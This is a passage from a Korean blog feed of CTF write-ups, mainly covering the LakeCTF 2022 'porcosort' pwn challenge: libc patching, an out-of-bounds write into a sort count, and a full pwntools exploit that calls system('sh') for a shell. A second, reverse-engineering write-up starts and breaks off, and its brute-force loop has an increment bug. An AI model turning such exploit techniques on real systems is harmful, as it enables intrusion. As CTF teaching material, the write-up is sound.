진행했을 때는 버전에 맞는 libc가 없어서 실행조차 되지 않았는데, 여기선 그래도 실행은 된다. 하지만 아무리 실행이 되더라도 remote와 환경이 다를 수도 있기 때문에 제공된 도커파일을 꼭 확인해야 한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ldd porcosort </span><br><span class="line">linux-vdso.so.1 (0x00007ffc8615e000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f976d66e000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f976d8ad000)</span><br></pre></td></tr></table></figure><p>도커파일을 확인해보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM docker.io/library/archlinux@sha256:2bfe247c46221b0770325d69ec195b50455b2865588665e6926b2d1168982e67 AS builder</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>문제 환경이 Ubuntu가 아니라 arch linux임을 알 수 있다. 저기로 접속해서 libc를 가져와 바이너리를 patch하는 작업을 진행하자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v `pwd`:/data archlinux@sha256:2bfe247c46221b0770325d69ec195b50455b2865588665e6926b2d1168982e67 bash</span><br></pre></td></tr></table></figure><p>도커를 실행하면 컨테이너에 접속할 수 있다.<br>다른 터미널 창을 열어서 컨테이너로 문제 바이너리를 넣어주고 <code>ldd</code> 명령어로 매핑된 라이브러리를 확인해보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /home/jir4vvit/ctf/lake/porcosort2/porcorsort ce9c17249f0e:/home/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ce9c17249f0e home]# ldd porcosort</span><br><span class="line">linux-vdso.so.1 (0x00007fff4e6ca000)</span><br><span class="line">libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f2f35895000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f2f35aae000)</span><br></pre></td></tr></table></figure><p>다른 터미널에서 아래 두 명령어로 컨테이너 안의 ld와 libc 파일을 가져오자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp ce9c17249f0e:/usr/lib/libc.so.6 /home/jir4vvit/ctf/lake/porcosort2/</span><br><span class="line">docker cp ce9c17249f0e:/usr/lib64/ld-linux-x86-64.so.2 /home/jir4vvit/ctf/lake/porcosort2/</span><br></pre></td></tr></table></figure><p>그럼 이제 로컬에 ld와 libc가 저장이 되고, <code>patchelf</code>를 이용해서 바이너리를 패치할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ patchelf --set-rpath . --replace-needed libc.so.6 ./libc.so.6 porcosort</span><br><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ patchelf --set-rpath . --set-interpreter ./ld-linux-x86-64.so.2 porcosort</span><br><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ldd porcosort </span><br><span class="line">linux-vdso.so.1 (0x00007ffff7d92000)</span><br><span class="line">./libc.so.6 (0x00007f3122b16000)</span><br><span class="line">./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f3122d2f000)</span><br></pre></td></tr></table></figure><p><code>--set-interpreter &lt;ld&gt;</code>: 다운받은 ld(로더)를 지정<br><code>--replace-needed &lt;libc&gt;</code>: libc 교체 </p><p>그럼 이제 문제 환경(remote)와 local이 똑같아졌다! 가젯 찾을 일 있으면 가져온 libc나 ld에서 가젯찾으면 된다.</p><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>전부 다 걸려있다. :(</p><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>우리의 친구 IDA와 함께 차근차근 분석하면서 취약점을 찾아보자.</p><h4 id="vuln-함수"><a href="#vuln-함수" class="headerlink" title="vuln 함수"></a>vuln 함수</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vuln</span><span class="params">(<span class="type">unsigned</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  __int64 stack_buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 sort_cnt; <span class="comment">// [rsp+1A0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">47</span>; ++i )</span><br><span class="line">    stack_buf[i] = _bss_start;</span><br><span class="line">  __asm &#123; rdrand  rbx &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Have a gift: %p\n&quot;</span>, stack_buf[(_RBX ^ a1) % <span class="number">0x30</span>]);<span class="comment">// _IO_2_1_stdout_</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many numbers to sort? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;sort_cnt);            <span class="comment">// 48</span></span><br><span class="line">  <span class="keyword">if</span> ( sort_cnt &gt; <span class="number">48</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  read_numbers(stack_buf, sort_cnt);</span><br><span class="line">  get_gnomed(stack_buf, sort_cnt);              <span class="comment">// 정렬하는 코드</span></span><br><span class="line">                                                <span class="comment">// 여기 sort_cnt 값 조작 가능 (48보다 큰 수 넣기 가능)</span></span><br><span class="line">                                                <span class="comment">// 정확히는 read_numbers에서 oob write 발생</span></span><br><span class="line">  <span class="keyword">return</span> canary - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vuln</code> 함수에서 <code>_IO_2_1_stdout_</code>을 출력해 준다. (gdb로 바로 찍어봤다.)<br>그리고 어떠한 수를 입력받고 그 입력값을 인자로 <code>read_numbers</code> 함수와 <code>get_gnomed</code> 함수를 호출한다.</p><h4 id="read-numbers-함수"><a href="#read-numbers-함수" class="headerlink" title="read_numbers 함수"></a>read_numbers 함수</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_numbers</span><span class="params">(_QWORD *buf, __int64 cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = cnt;</span><br><span class="line">  <span class="keyword">for</span> ( i = cnt; i &gt; <span class="number">0</span>; --i )                   <span class="comment">// 뒤에서부터 채우기</span></span><br><span class="line">                                                <span class="comment">// cnt ~ 1</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    buf[i] = <span class="string">&#x27;*&#x27;</span>;                               <span class="comment">// *로 채우기</span></span><br><span class="line">    result = __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;buf[i]);   <span class="comment">// * 찍은 곳에 값 쓰기 가능</span></span><br><span class="line">                                                <span class="comment">// (위에서 한 * 채우기는 그냥 초기화 작업)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>두 번째 인자 <code>cnt</code>는 나의 입력 값이다. 결론적으로 스택에 내가 원하는 데이터를 넣을 수 있다.</p><p>이때 oob write가 가능하다. 인자로 넘어온 <code>buf</code>는 크기가 48이다. 이때 <code>cnt</code>가 48이라면 <code>&amp;buf[48]</code>에 접근하여 쓰기가 가능하다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;buf[48] ~ &amp;buf[1]</span><br></pre></td></tr></table></figure><p>oob write가 발생하지 않으려면(원래대로라면) 아래처럼 0부터 <code>cnt-1</code>까지만 접근해야겠지.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;buf[48-1] ~ &amp;buf[0]</span><br></pre></td></tr></table></figure><p>그럼 이제 우리가 oob를 통해 접근할 수 있는 <code>&amp;buf[48]</code>에 저장된 값이 뭔지 궁금하다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__int64 stack_buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 sort_cnt; <span class="comment">// [rsp+1A0h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br></pre></td></tr></table></figure><p><code>buf</code> 바로 밑에 <code>cnt</code>가 존재한다. 그렇다. <code>&amp;buf[48]</code>에는 우리의 입력값인 <code>cnt</code>가 저장되어 있다. 이 말 즉슨.. <code>read_numbers</code> 함수가 끝나고 다음 호출될 <code>get_gnomed</code> 함수의 인자를 조작 가능하다는 의미이다.</p><h4 id="get-gnomed-함수"><a href="#get-gnomed-함수" class="headerlink" title="get_gnomed 함수"></a>get_gnomed 함수</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">get_gnomed</span><span class="params">(_QWORD *buf, __int64 cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *curr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  curr = buf;</span><br><span class="line">  <span class="keyword">while</span> ( curr &lt; &amp;buf[cnt] )                    <span class="comment">// 처음엔 stdout addr</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( curr == buf || *curr &gt;= *(curr - <span class="number">1</span>) ) <span class="comment">// 음수로 크기 비교</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++curr;                                   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *curr ^= *(curr - <span class="number">1</span>);</span><br><span class="line">      *(curr - <span class="number">1</span>) ^= *curr;</span><br><span class="line">      *curr ^= *(curr - <span class="number">1</span>);</span><br><span class="line">      --curr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그냥 크기 순으로 정렬하는 코드이다. 대소비교에 마우스를 올려보면 <code>*curr &gt;= *(curr-1)</code> 에서 signed로 비교를 하고 있는 것을 확인할 수 있다. 참고로 이 사실은 익스하는 데에 있어서 아주 중요하다.. </p><p>스택에 원하는 값들을 적으면 결국 여기에서 다시 정렬하게 되는데, 크기 순으로 정렬이 되니까 값을 어떻게 넣을 지 생각을 잘해야 한다.</p><p>음 취약점을 설명하는 해당 부분에서는 살짝 맞지 않는 것 같지만 이어서 설명하는 것이 이해하기에 쉬운 것 같아 바로 스택을 보여주겠다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe3265c040:0x00007f29d7a406c00x8000000000006873</span><br><span class="line">0x7ffe3265c050:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c060:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c070:0x80000000000068730x8000000000006873</span><br><span class="line">...</span><br><span class="line">0x7ffe3265c190:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1a0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1b0:0x00007f29d788ca400x00007f29d786a1d6</span><br><span class="line">0x7ffe3265c1c0:0x00000000000000390xa614ed753417eb00 // 0x7ffe3265c1c8: canary</span><br><span class="line">0x7ffe3265c1d0:0x00000000000000000xa3d3707cd6109c68</span><br><span class="line">0x7ffe3265c1e0:0x00007ffe3265c2400x0000562e91ec649e // 해당 함수가 끝나고 0x0000562e91ec649e로 감</span><br><span class="line">0x7ffe3265c1f0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c200:0x80000000000068730x0000000000000000</span><br></pre></td></tr></table></figure><p>이 값들을 <code>get_gnomed</code> 함수를 거치면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe3265c040:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c050:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c060:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c070:0x80000000000068730x8000000000006873</span><br><span class="line">...</span><br><span class="line">0x7ffe3265c190:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1a0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1b0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1c0:0xa3d3707cd6109c680xa614ed753417eb00 // 0x7ffe3265c1c8: canary</span><br><span class="line">0x7ffe3265c1d0:0x00000000000000000x0000000000000039</span><br><span class="line">0x7ffe3265c1e0:0x0000562e91ec649e0x00007f29d786a1d6 // 0x7ffe3265c1e8: ret address</span><br><span class="line">0x7ffe3265c1f0:0x00007f29d788ca400x00007f29d7a406c0 // 0x7ffe3265c1f0: system address</span><br><span class="line">0x7ffe3265c200:0x00007ffe3265c2400x0000000000000000</span><br></pre></td></tr></table></figure><p>현재 카나리는 <code>0x7ffe3265c1c8</code> 주소에 위치한다.</p><p>익스를 작성할 때 가장 까다로운 점은 카나리의 값이 랜덤이란 점이다. 이 위치가 바뀌면 당연하게도 <code>*** stack smashing detected ***: terminated</code>이 발생하는데, 카나리의 값은 랜덤이기 때문에 적당히 작은 수(음수?)이길 기대해야 한다. 이 때문에 익스 코드는 확률이 조금 있다.</p><p>그리고 <code>0x8000000000006873</code>가 보이는데 이는 <code>-9223372036854749069</code> 이다. 사실은 <code>sh</code>을 의도한 문자열이다. 왜 이렇게 줬을까?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x56310fe0d428 &lt;vuln+294&gt;    call   get_gnomed                &lt;get_gnomed&gt;</span><br><span class="line">       rdi: 0x7ffe3265c040 —▸ 0x7f4d54ba36c0 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">       rsi: 0x39</span><br><span class="line">       rdx: 0x39</span><br><span class="line">       rcx: 0x0</span><br></pre></td></tr></table></figure><p><code>get_gnomed</code> 함수를 호출할 떄 rdi의 값은 <code>0x7ffe3265c040</code>이다. 이 함수에서 <code>rdi</code>를 쓰지 않기 때문에 함수가 종료될 때도 rdi가 동일하다.</p><p>그렇단 뜻은 <code>system</code> 함수를 실행할 때 내가 원하는 매우 작은 값으로 <code>rdi</code>로 지정할 수 있단 뜻</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="시나리오"><a href="#시나리오" class="headerlink" title="시나리오"></a>시나리오</h3><ol><li>OOB write 트리거 위해 <code>cnt</code> 입력 시 48 입력</li><li><code>_IO_2_1_stdout_</code> 출력해주는 것을 이용하여 libc base 구하기</li><li>정렬할 값들을 적을 때(스택에 값을 적을 때) <code>cnt</code>를 더 큰 수로 하기 위해 맨 처음 57 입력 &lt;- OOB write 트리거 됨</li><li>스택에 페이로드 입력: ret 가젯 필요 (<code>movaps xmmword ptr [rsp + 0x50], xmm0</code>에서 멈추기 때문)</li><li>카나리의 위치가 제 위치에 온전히 있을 수 있도록 기도</li></ol><p>여담이지만 <code>ret</code> 주소가 <code>system</code> 주소보다 작게 구해졌기 때문에 이거에 대한 크기 고민은 하지 않았다.</p><h3 id="가젯-찾기"><a href="#가젯-찾기" class="headerlink" title="가젯 찾기"></a>가젯 찾기</h3><h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ROPgadget --binary libc.so.6 | grep &quot; : ret&quot;</span><br><span class="line">0x00000000000291d6 : ret</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./porcosort&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.polygl0ts.ch&#x27;, 3900)</span></span><br><span class="line">e= ELF(<span class="string">&#x27;./porcosort&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./ld-linux-x86-64.so.2&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sh += <span class="string">&quot;sh\x00&quot;</span>.ljust(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;\x80&#x27;</span></span><br><span class="line">p.send(sh * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;leak :: &#x27;</span>+ <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;sort? &#x27;</span>, <span class="built_in">str</span>(<span class="number">48</span>)) <span class="comment"># it caused an oob write</span></span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x291d6</span> <span class="comment">#0x29cd6</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = [<span class="number">57</span>, ret, system] <span class="comment"># 57: sort count overwriting</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span> - <span class="built_in">len</span>(payload)):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(-<span class="number">9223372036854749069</span>)) <span class="comment"># input 0x8000000000006873</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] leak :: 0x7fb8ce4466c0</span><br><span class="line">[*] libc base :: 0x7fb8ce247000</span><br><span class="line">[57, 140431709372886, 140431709514304]</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(jail) gid=1000(jail) groups=1000(jail)</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">run</span><br><span class="line">$ cat flag</span><br><span class="line">EPFL&#123;https://www.youtube.com/watch?v=2HjspVV0jK4&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> LakeCTF </tag>
            
            <tag> Dockerfile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - baby rev (rev, z3)</title>
      <link href="/221003-lakectf2022-baby_rev/"/>
      <url>/221003-lakectf2022-baby_rev/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리, nc 접속 주소</p><p>평소에 리버싱 분야를 잘 풀지 않는데, 뭔가 오늘따라 풀어보고 싶어서 솔브가 많은 리버싱 하나 열어봤다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>IDA로 열면 main함수가 있는데 대충 핵심적인 부분(밖에 없지만)을 가져오면 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1LL</span>, <span class="string">&quot;What&#x27;s your your number:&quot;</span>, envp);</span><br><span class="line">fflush(_bss_start);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;input);</span><br><span class="line">v3 = <span class="number">0LL</span>;</span><br><span class="line">key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( input - <span class="number">0x10000</span> &gt; <span class="number">0x7FFF0000</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_4;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v5 = input &gt;&gt; v3++;</span><br><span class="line">  key = (v5 &amp; <span class="number">1</span>) + <span class="number">2</span> * key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v3 != <span class="number">0x20</span> );</span><br><span class="line"><span class="keyword">if</span> ( input == key )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">// print flag</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>사용자 입력을 받고 그 입력에 대해 ‘어떠한 연산’을 진행한 결과(key)와 비교해서 맞으면 flag를 출력해준다.</p><p>브루트 포싱을 하면 되지 않을까? 이 코드를 c로 옮겨서 브포해봐야겠다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o solve solve.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> input = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (input - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>) &#123;</span><br><span class="line"><span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> v3 = <span class="number">0</span>; v3 &lt; <span class="number">0x20</span>; v5++) &#123;</span><br><span class="line">key = ((input &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (input == key) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, input);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">input++;</span><br><span 